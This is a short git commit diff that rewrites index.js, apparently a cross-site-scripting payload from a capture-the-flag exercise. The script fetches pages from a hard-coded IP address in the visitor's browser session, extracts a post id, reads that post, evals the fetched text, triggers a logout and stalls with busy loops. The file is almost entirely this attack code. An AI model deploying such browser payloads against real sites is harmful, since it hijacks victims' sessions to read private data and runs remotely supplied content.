d6189bc43691db01d84c7291759f817a58cd910d
as3617 <46442697+as3617@users.noreply.github.com>
2020-11-16 18:12:17 +0900

    Update index.js

--- index.js
+++ index.js
@@ -1,5 +1,4 @@
-fetch("http://211.239.124.243:18603/?").then(x=>x.text()).then(x=>eval("a=x.substring(x.indexOf('/read?id=')+9,x.indexOf('/read?id=')+73)"));
-fetch("http://211.239.124.243:18603/read/"+a+"?").then(x=>x.text()).then(x=>eval(data=JSON.stringify(x)));
+fetch("http://211.239.124.243:18603/?").then(x=>x.text()).then(x=>eval("x.substring(x.indexOf('/read?id=')+9,x.indexOf('/read?id=')+73)")).then(x=>fetch("http://211.239.124.243:18603/read/"+x+"?").then(a=>a.text()).then(a=>eval(JSON.stringify(a))));
 for(i=0;i<10000000;i++){}
 fetch("http://211.239.124.243:18603/logout?");
 for(i=0;i<10000000000;i++){}
